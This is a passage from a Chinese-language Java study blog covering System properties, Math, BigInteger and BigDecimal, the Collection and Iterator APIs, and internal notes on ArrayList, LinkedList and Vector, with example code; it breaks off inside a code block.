<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/73bb56682e583202b5dce7dadb23a2d0--3b71--06.png" alt="06"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SystemDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">javaVersion</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;java.version&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;java的version:&quot;</span> + javaVersion);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">javaHome</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;java.home&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;java的home:&quot;</span> + javaHome);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">osName</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;os的name:&quot;</span> + osName);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">osVersion</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.version&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;os的version:&quot;</span> + osVersion);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">userName</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.name&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;user的name:&quot;</span> + userName);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">userHome</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.home&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;user的home:&quot;</span> + userHome);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">userDir</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.dir&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;user的dir:&quot;</span> + userDir);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*        java的version:22.0.2</span></span><br><span class="line"><span class="comment">        java的home:C:\Users\ASUS\.jdks\openjdk-22.0.2</span></span><br><span class="line"><span class="comment">        os的name:Windows 11</span></span><br><span class="line"><span class="comment">        os的version:10.0</span></span><br><span class="line"><span class="comment">        user的name:ASUS</span></span><br><span class="line"><span class="comment">        user的home:C:\Users\ASUS</span></span><br><span class="line"><span class="comment">        user的dir:E:\JavaWeb\Demo</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2、Math类"><a href="#2、Math类" class="headerlink" title="2、Math类"></a>2、Math类</h4><ul>
<li>这个在之前也简单使用过的</li>
</ul>
<blockquote>
<p>java.lang.Math提供了一系列静态方法用于科学计算。其方法的参数和返回值类型一般为double型。</p>
</blockquote>
<blockquote>
<p>abs     绝对值</p>
<p>acos,asin,atan,cos,sin,tan  三角函数</p>
<p>sqrt     平方根</p>
<p>pow(double a,doble b)     a的b次幂</p>
<p>log    自然对数</p>
<p>exp    e为底指数</p>
<p>max(double a,double b)</p>
<p>min(double a,double b)</p>
<p>random()      返回0.0到1.0的随机数</p>
<p>long round(double a)     double型数据a转换为long型（四舍五入）</p>
<p>toDegrees(double angrad)     弧度—&gt;角度</p>
<p>toRadians(double angdeg)     角度—&gt;弧度</p>
</blockquote>
<h4 id="3、BigInteger与BigDecimal"><a href="#3、BigInteger与BigDecimal" class="headerlink" title="3、BigInteger与BigDecimal"></a>3、BigInteger与BigDecimal</h4><ul>
<li><p>Integer类作为int的包装类，能存储的最大整型值为2^31 -1，Long类也是有限的，最大为2^63 -1。如果要表示再大的整数，不管是基本数据类型还是他们的包装类都无能为力，更不用说进行运算了。</p>
</li>
<li><p>java.math包的BigInteger可以表示不可变的任意精度的整数。BigInteger 提供所有Java 的基本整数操作符的对应物，并提供java.lang.Math 的所有相关方法。另外，BigInteger 还提供以下运算：模算术、GCD 计算、质数测试、素数生成、位操作以及一些其他操作。</p>
</li>
<li><p>构造器</p>
<ul>
<li>BigInteger(String val)：根据字符串构建BigInteger对象</li>
</ul>
</li>
<li><p>常用方法</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/42ffa72f12011be3b40c0802081b0816--02c2--07.png" alt="07"></p>
<ul>
<li>一般的Float类和Double类可以用来做科学计算或工程计算，但<strong>在商业计算中，要求数字精度比较高，故用到java.math.BigDecimal类</strong>。</li>
<li>BigDecimal类支持不可变的、任意精度的有符号十进制定点数。</li>
<li>构造器<ul>
<li>public BigDecimal(double val)</li>
<li>public BigDecimal(String val)</li>
</ul>
</li>
<li>常用方法<ul>
<li>public BigDecimal add(BigDecimal augend)</li>
<li>public BigDecimal subtract(BigDecimal subtrahend)</li>
<li>public BigDecimal multiply(BigDecimal multiplicand)</li>
<li>public BigDecimal divide(BigDecimal divisor, int scale, int roundingMode)</li>
</ul>
</li>
</ul>
<h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><h3 id="1、Java集合框架概述"><a href="#1、Java集合框架概述" class="headerlink" title="1、Java集合框架概述"></a>1、Java集合框架概述</h3><h4 id="1、集合框架和数组的对比及概述"><a href="#1、集合框架和数组的对比及概述" class="headerlink" title="1、集合框架和数组的对比及概述"></a>1、集合框架和数组的对比及概述</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 一、集合的框架</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 1.集合、数组都是对多个数据进行存储操作的结构，简称Java容器。</span></span><br><span class="line"><span class="comment"> *   说明；此时的存储，主要是指能存层面的存储，不涉及到持久化的存储（.txt,.jpg,.avi,数据库中）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 2.1数组在存储多个数据封面的特点：</span></span><br><span class="line"><span class="comment"> *      》一旦初始化以后，它的长度就确定了。</span></span><br><span class="line"><span class="comment"> *      》数组一旦定义好，它的数据类型也就确定了。我们就只能操作指定类型的数据了。</span></span><br><span class="line"><span class="comment"> *      比如：String[] arr;int[] str;</span></span><br><span class="line"><span class="comment"> * 2.2数组在存储多个数据方面的特点：</span></span><br><span class="line"><span class="comment"> *      》一旦初始化以后，其长度就不可修改。</span></span><br><span class="line"><span class="comment"> *      》数组中提供的方法非常有限，对于添加、删除、插入数据等操作，非常不便，同时效率不高。</span></span><br><span class="line"><span class="comment"> *      》获取数组中实际元素的个数的需求，数组没有现成的属性或方法可用</span></span><br><span class="line"><span class="comment"> *      》数组存储数据的特点：有序、可重复。对于无序、不可重复的需求，不能满足。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>集合的使用场景</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/689411ff1ee20d9f4676a6f37a92f14e--e1a9--image-20240926103359953.png" alt="image-20240926103359953"></p>
</li>
</ul>
<h4 id="2、集合框架涉及到的API"><a href="#2、集合框架涉及到的API" class="headerlink" title="2、集合框架涉及到的API"></a>2、集合框架涉及到的API</h4><ul>
<li><p>Java 集合可分为Collection 和Map 两种体系</p>
<ul>
<li>Collection接口：单列数据，定义了存取一组对象的方法的集合<ul>
<li>List：元素有序、可重复的集合</li>
<li>Set：元素无序、不可重复的集合</li>
</ul>
</li>
<li>Map接口：双列数据，保存具有映射关系“key-value对”的集合</li>
</ul>
</li>
<li><p><strong>Collection接口继承树</strong></p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/e5c5d1664e576887561e0b5d345399a0--f2ed--image-20240926103900334.png" alt="image-20240926103900334"></p>
<ul>
<li><strong>Map接口继承树</strong></li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/49f74611c39b83069b6b4b3b4fc70fe0--4580--image-20240926103921057.png" alt="image-20240926103921057"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 二、集合框架</span></span><br><span class="line"><span class="comment"> *      &amp;---Collection接口：单列集合，用来存储一个一个的对象</span></span><br><span class="line"><span class="comment"> *          &amp;---List接口：存储有序的、可重复的数据。  --&gt;“动态”数组</span></span><br><span class="line"><span class="comment"> *              &amp;---ArrayList、LinkedList、Vector</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *          &amp;---Set接口：存储无序的、不可重复的数据   --&gt;高中讲的“集合”</span></span><br><span class="line"><span class="comment"> *              &amp;---HashSet、LinkedHashSet、TreeSet</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      &amp;---Map接口：双列集合，用来存储一对(key - value)一对的数据   --&gt;高中函数：y = f(x)</span></span><br><span class="line"><span class="comment"> *          &amp;---HashMap、LinkedHashMap、TreeMap、Hashtable、Properties</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h3 id="2、Collection接口方法"><a href="#2、Collection接口方法" class="headerlink" title="2、Collection接口方法"></a>2、Collection接口方法</h3><ul>
<li>Collection 接口是List、Set 和Queue 接口的父接口，该接口里定义的方法既可用于操作Set 集合，也可用于操作List 和Queue 集合。</li>
<li>JDK不提供此接口的任何直接实现，而是提供更具体的子接口(如：Set和List)实现。</li>
<li>在Java5 之前，Java 集合会丢失容器中所有对象的数据类型，把所有对象都当成Object 类型处理；从JDK 5.0 增加了<strong>泛型</strong>以后，Java 集合可以记住容器中对象的数据类型。</li>
</ul>
<h4 id="Collection接口中的常用方法"><a href="#Collection接口中的常用方法" class="headerlink" title="Collection接口中的常用方法"></a>Collection接口中的常用方法</h4><ol>
<li>添加<ul>
<li>add(Objectobj)</li>
<li>addAll(Collectioncoll)</li>
</ul>
</li>
<li>获取有效元素的个数<ul>
<li>intsize()</li>
</ul>
</li>
<li>清空集合<ul>
<li>voidclear()</li>
</ul>
</li>
<li>是否是空集合<ul>
<li>boolean isEmpty()</li>
</ul>
</li>
<li>是否包含某个元素<ul>
<li>booleancontains(Objectobj)：是通过元素的equals方法来判断是否是同一个对象</li>
<li>booleancontainsAll(Collectionc)：也是调用元素的equals方法来比较的。拿两个集合的元素挨个比较。</li>
</ul>
</li>
<li>删除<ul>
<li>boolean remove(Object obj) ：通过元素的equals方法判断是否是要删除的那个元素。只会删除找到的第一个元素</li>
<li>boolean removeAll(Collection coll)：取当前集合的差集</li>
</ul>
</li>
<li>取两个集合的交集<ul>
<li>boolean retainAll(Collection c)：把交集的结果存在当前集合中，不影响c</li>
</ul>
</li>
<li>集合是否相等<ul>
<li>boolean equals(Object obj)</li>
</ul>
</li>
<li>转成对象数组<ul>
<li>Object[] toArray()</li>
</ul>
</li>
<li>获取集合对象的哈希值<ul>
<li>hashCode()</li>
</ul>
</li>
<li>遍历<ul>
<li>iterator()：返回迭代器对象，用于集合遍历</li>
</ul>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CollectionTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Collection</span> <span class="variable">collection</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        collection.add(<span class="number">1</span>);</span><br><span class="line">        collection.add(<span class="number">2</span>);</span><br><span class="line">        collection.add(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(collection); <span class="comment">//[1, 2, 3]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-Iterator迭代器接口"><a href="#3-Iterator迭代器接口" class="headerlink" title="3.Iterator迭代器接口"></a>3.Iterator迭代器接口</h3><ul>
<li>Iterator对象称为迭代器(设计模式的一种)，主要用于遍历Collection 集合中的元素。</li>
<li>GOF给迭代器模式的定义为：提供一种方法访问一个容器(container)对象中各个元素，而又不需暴露该对象的内部细节。<strong>迭代器模式，就是为容器而生</strong>。类似于“公交车上的售票员”、“火车上的乘务员”、“空姐”。</li>
<li>Collection接口继承了java.lang.Iterable接口，该接口有一个iterator()方法，那么所有实现了Collection接口的集合类都有一个iterator()方法，用以返回一个实现了Iterator接口的对象。</li>
<li><strong>Iterator 仅用于遍历集合</strong>，Iterator本身并不提供承装对象的能力。如果需要创建Iterator 对象，则必须有一个被迭代的集合。</li>
<li><strong>集合对象每次调用iterator()方法都得到一个全新的迭代器对象</strong>，默认游标都在集合的第一个元素之前。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IteratorTest</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Collection</span> <span class="variable">coll</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        coll.add(<span class="number">123</span>);</span><br><span class="line">        coll.add(<span class="number">456</span>);</span><br><span class="line">        coll.add(<span class="string">&quot;Jerry&quot;</span>);</span><br><span class="line">        coll.add(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Tom&quot;</span>));</span><br><span class="line">        coll.add(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> coll.iterator();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方式一：</span></span><br><span class="line"><span class="comment">//        System.out.println(iterator.next());</span></span><br><span class="line"><span class="comment">//        System.out.println(iterator.next());</span></span><br><span class="line"><span class="comment">//        System.out.println(iterator.next());</span></span><br><span class="line"><span class="comment">//        System.out.println(iterator.next());</span></span><br><span class="line"><span class="comment">//        System.out.println(iterator.next());</span></span><br><span class="line"><span class="comment">//        //报异常：NoSuchElementException</span></span><br><span class="line"><span class="comment">//        //因为：在调用it.next()方法之前必须要调用it.hasNext()进行检测。若不调用，且下一条记录无效，直接调用it.next()会抛出NoSuchElementException异常。</span></span><br><span class="line"><span class="comment">//        System.out.println(iterator.next());</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//方式二：不推荐</span></span><br><span class="line"><span class="comment">//        for(int i = 0;i &lt; coll.size();i++)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(iterator.next());</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//方式三：推荐</span></span><br><span class="line">        <span class="keyword">while</span>(iterator.hasNext())&#123;</span><br><span class="line">            System.out.println(iterator.next());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="迭代器Iterator的执行原理"><a href="#迭代器Iterator的执行原理" class="headerlink" title="迭代器Iterator的执行原理"></a>迭代器Iterator的执行原理</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/2e1a01fbd76a3b98b8060678b8c652da--578a--image-20240926113011579.png" alt="image-20240926113011579"></p>
<h4 id="Iterator迭代器remove-的使用"><a href="#Iterator迭代器remove-的使用" class="headerlink" title="Iterator迭代器remove()的使用"></a>Iterator迭代器remove()的使用</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 集合元素的遍历操作，使用迭代器Iterator接口</span></span><br><span class="line"><span class="comment"> * 1.内部的方法：hasNext()和 next()</span></span><br><span class="line"><span class="comment"> * 2.集合对象每次调用iterator()方法都得到一个全新的迭代器对象，默认游标都在集合的第一个元素之前。</span></span><br><span class="line"><span class="comment"> * 3.内部定义了remove(),可以在遍历的时候，删除集合中的元素。此方法不同于集合直接调用remove()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> subei</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2020-05-12 12:22</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IteratorTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//测试Iterator中的remove()方法</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test3</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Collection</span> <span class="variable">coll</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        coll.add(<span class="number">123</span>);</span><br><span class="line">        coll.add(<span class="number">456</span>);</span><br><span class="line">        coll.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Jerry&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        coll.add(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Tom&quot;</span>));</span><br><span class="line">        coll.add(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//删除集合中”Tom”</span></span><br><span class="line">        <span class="comment">//如果还未调用next()或在上一次调用 next 方法之后已经调用了 remove 方法，</span></span><br><span class="line">        <span class="comment">// 再调用remove都会报IllegalStateException。</span></span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> coll.iterator();</span><br><span class="line">        <span class="keyword">while</span>(iterator.hasNext())&#123;</span><br><span class="line"><span class="comment">//            iterator.remove();</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> iterator.next();</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;Tom&quot;</span>.equals(obj))&#123;</span><br><span class="line">                iterator.remove();</span><br><span class="line"><span class="comment">//                iterator.remove();                </span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历集合</span></span><br><span class="line">        iterator = coll.iterator();</span><br><span class="line">        <span class="keyword">while</span>(iterator.hasNext())&#123;</span><br><span class="line">            System.out.println(iterator.next());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>注意：<ul>
<li>Iterator可以删除集合的元素，但是是遍历过程中通过迭代器对象的remove方法，不是集合对象的remove方法。</li>
<li><strong>如果还未调用next()或在上一次调用next方法之后已经调用了remove方法，再调用remove都会报IllegalStateException</strong>。</li>
</ul>
</li>
</ul>
<h4 id="新特性foreach循环遍历集合或数组"><a href="#新特性foreach循环遍历集合或数组" class="headerlink" title="新特性foreach循环遍历集合或数组"></a>新特性foreach循环遍历集合或数组</h4><ul>
<li>Java 5.0 提供了foreach循环迭代访问Collection和数组。</li>
<li>遍历操作不需获取Collection或数组的长度，无需使用索引访问元素。</li>
<li><strong>遍历集合的底层调用Iterator完成操作。</strong></li>
<li>foreach还可以用来遍历数组。</li>
</ul>
<h3 id="4、Collection子接口之一：List接口"><a href="#4、Collection子接口之一：List接口" class="headerlink" title="4、Collection子接口之一：List接口"></a>4、Collection子接口之一：List接口</h3><h3 id="4-Collection子接口之一：List接口"><a href="#4-Collection子接口之一：List接口" class="headerlink" title="4.Collection子接口之一：List接口"></a>4.Collection子接口之一：List接口</h3><ul>
<li>鉴于Java中数组用来存储数据的局限性，我们通常使用List替代数组</li>
<li>List集合类中元素有序、且可重复，集合中的每个元素都有其对应的顺序索引。</li>
<li>List容器中的元素都对应一个整数型的序号记载其在容器中的位置，可以根据序号存取容器中的元素。</li>
<li>JDK API中List接口的实现类常用的有：ArrayList、LinkedList和Vector。</li>
</ul>
<h4 id="List接口常用实现类的对比"><a href="#List接口常用实现类的对比" class="headerlink" title="List接口常用实现类的对比"></a>List接口常用实现类的对比</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1. List接口框架</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *    |----Collection接口：单列集合，用来存储一个一个的对象</span></span><br><span class="line"><span class="comment"> *          |----List接口：存储有序的、可重复的数据。  --&gt;“动态”数组,替换原有的数组</span></span><br><span class="line"><span class="comment"> *              |----ArrayList：作为List接口的主要实现类；线程不安全的，效率高；底层使用Object[] elementData存储</span></span><br><span class="line"><span class="comment"> *              |----LinkedList：对于频繁的插入、删除操作，使用此类效率比ArrayList高；底层使用双向链表存储</span></span><br><span class="line"><span class="comment"> *              |----Vector：作为List接口的古老实现类；线程安全的，效率低；底层使用Object[] elementData存储</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 面试题：比较ArrayList、LinkedList、Vector三者的异同？</span></span><br><span class="line"><span class="comment"> *        同：三个类都是实现了List接口，存储数据的特点相同：存储有序的、可重复的数据</span></span><br><span class="line"><span class="comment"> *        不同：见上</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h4 id="ArrayList的源码分析"><a href="#ArrayList的源码分析" class="headerlink" title="ArrayList的源码分析"></a>ArrayList的源码分析</h4><ul>
<li>ArrayList是List 接口的典型实现类、主要实现类</li>
<li>本质上，ArrayList是对象引用的一个”变长”数组</li>
</ul>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 2.ArrayList的源码分析：</span></span><br><span class="line"><span class="comment"> *   2.1 jdk 7情况下</span></span><br><span class="line"><span class="comment"> *      ArrayList list = new ArrayList();//底层创建了长度是10的Object[]数组elementData</span></span><br><span class="line"><span class="comment"> *      list.add(123);//elementData[0] = new Integer(123);</span></span><br><span class="line"><span class="comment"> *      ...</span></span><br><span class="line"><span class="comment"> *      list.add(11);//如果此次的添加导致底层elementData数组容量不够，则扩容。</span></span><br><span class="line"><span class="comment"> *      默认情况下，扩容为原来的容量的1.5倍，同时需要将原有数组中的数据复制到新的数组中。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      结论：建议开发中使用带参的构造器：ArrayList list = new ArrayList(int capacity)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   2.2 jdk 8中ArrayList的变化：</span></span><br><span class="line"><span class="comment"> *      ArrayList list = new ArrayList();//底层Object[] elementData初始化为&#123;&#125;.并没有创建长度为10的数组</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      list.add(123);//第一次调用add()时，底层才创建了长度10的数组，并将数据123添加到elementData[0]</span></span><br><span class="line"><span class="comment"> *      ...</span></span><br><span class="line"><span class="comment"> *      后续的添加和扩容操作与jdk 7 无异。</span></span><br><span class="line"><span class="comment"> *   2.3 小结：jdk7中的ArrayList的对象的创建类似于单例的饿汉式，而jdk8中的ArrayList的对象</span></span><br><span class="line"><span class="comment"> *            的创建类似于单例的懒汉式，延迟了数组的创建，节省内存。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="LinkedList的源码分析"><a href="#LinkedList的源码分析" class="headerlink" title="LinkedList的源码分析"></a>LinkedList的源码分析</h4><ul>
<li><p>对于频繁的插入或删除元素的操作，建议使用LinkedList类，效率较高</p>
</li>
<li><p>LinkedList：双向链表，内部没有声明数组，而是定义了Node类型的first和last，用于记录首末元素。同时，定义内部类Node，作为LinkedList中保存数据的基本结构。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/d310da4fde968e21e9c4cd5fb731e3e1--e5c3--image-20240926114757184.png" alt="image-20240926114757184"></p>
</li>
</ul>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 3.LinkedList的源码分析：</span></span><br><span class="line"><span class="comment">  *       LinkedList list = new LinkedList(); 内部声明了Node类型的first和last属性，默认值为null</span></span><br><span class="line"><span class="comment">  *       list.add(123);//将123封装到Node中，创建了Node对象。</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  *       其中，Node定义为：体现了LinkedList的双向链表的说法</span></span><br><span class="line"><span class="comment">  *       private static class Node&lt;E&gt; &#123;</span></span><br><span class="line"><span class="comment">  *            E item;</span></span><br><span class="line"><span class="comment">  *            Node&lt;E&gt; next;</span></span><br><span class="line"><span class="comment">  *            Node&lt;E&gt; prev;</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  *            Node(Node&lt;E&gt; prev, E element, Node&lt;E&gt; next) &#123;</span></span><br><span class="line"><span class="comment">  *            this.item = element;</span></span><br><span class="line"><span class="comment">  *            this.next = next;     //next变量记录下一个元素的位置</span></span><br><span class="line"><span class="comment">  *            this.prev = prev;     //prev变量记录前一个元素的位置</span></span><br><span class="line"><span class="comment">  *            &#125;</span></span><br><span class="line"><span class="comment">  *        &#125;</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="Vector的源码分析"><a href="#Vector的源码分析" class="headerlink" title="Vector的源码分析"></a>Vector的源码分析</h4><ul>
<li>Vector 是一个古老的集合，JDK1.0就有了。大多数操作与ArrayList相同，区别之处在于Vector是线程安全的。</li>
<li>在各种list中，最好把ArrayList作为缺省选择。当插入、删除频繁时，使用LinkedList；Vector总是比ArrayList慢，所以尽量避免使用。</li>
</ul>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment">  * 4.Vector的源码分析：jdk7和jdk8中通过Vector()构造器创建对象时，底层都创建了长度为10的数组。</span></span><br><span class="line"><span class="comment">  *      在扩容方面，默认扩容为原来的数组长度的2倍。</span></span><br><span class="line"><span class="comment">  */</span>    </span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="List接口中的常用方法测试"><a href="#List接口中的常用方法测试" class="headerlink" title="List接口中的常用方法测试"></a>List接口中的常用方法测试</h4><ul>
<li>List除了从Collection集合继承的方法外，List 集合里添加了一些根据索引来操作集合元素的方法。<ul>
<li>void add(intindex, Object ele):在index位置插入ele元素</li>
<li>boolean addAll(int index, Collection eles):从index位置开始将eles中的所有元素添加进来</li>
<li>Object get(int index):获取指定index位置的元素</li>
<li>int indexOf(Object obj):返回obj在集合中首次出现的位置</li>
<li>int lastIndexOf(Object obj):返回obj在当前集合中末次出现的位置</li>
<li>Object remove(int index):移除指定index位置的元素，并返回此元素</li>
<li>Object set(int index, Object ele):设置指定index位置的元素为ele</li>
<li>List subList(int fromIndex, int toIndex):返回从fromIndex到toIndex位置的子集合</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 5.List接口的常用方法</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * void add(int index, Object ele):在index位置插入ele元素</span></span><br><span class="line"><span class="comment">     * boolean addAll(int index, Collection eles):从index位置开始将eles中的所有元素添加进来</span></span><br><span class="line"><span class="comment">     * Object get(int index):获取指定index位置的元素</span></span><br><span class="line"><span class="comment">     * int indexOf(Object obj):返回obj在集合中首次出现的位置</span></span><br><span class="line"><span class="comment">     * int lastIndexOf(Object obj):返回obj在当前集合中末次出现的位置</span></span><br><span class="line"><span class="comment">     * Object remove(int index):移除指定index位置的元素，并返回此元素</span></span><br><span class="line"><span class="comment">     * Object set(int index, Object ele):设置指定index位置的元素为ele</span></span><br><span class="line"><span class="comment">     * List subList(int fromIndex, int toIndex):返回从fromIndex到toIndex位置的子集合</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 总结：常用方法</span></span><br><span class="line"><span class="comment">     * 增：add(Object obj)</span></span><br><span class="line"><span class="comment">     * 删：remove(int index) / remove(Object obj)</span></span><br><span class="line"><span class="comment">     * 改：set(int index, Object ele)</span></span><br><span class="line"><span class="comment">     * 查：get(int index)</span></span><br><span class="line"><span class="comment">     * 插：add(int index, Object ele)</span></span><br><span class="line"><span class="comment">     * 长度：size()</span></span><br><span class="line"><span class="comment">     * 遍历：① Iterator迭代器方式</span></span><br><span class="line"><span class="comment">     *      ② 增强for循环</span></span><br><span class="line"><span class="comment">     *      ③ 普通的循环</span></span><br><span 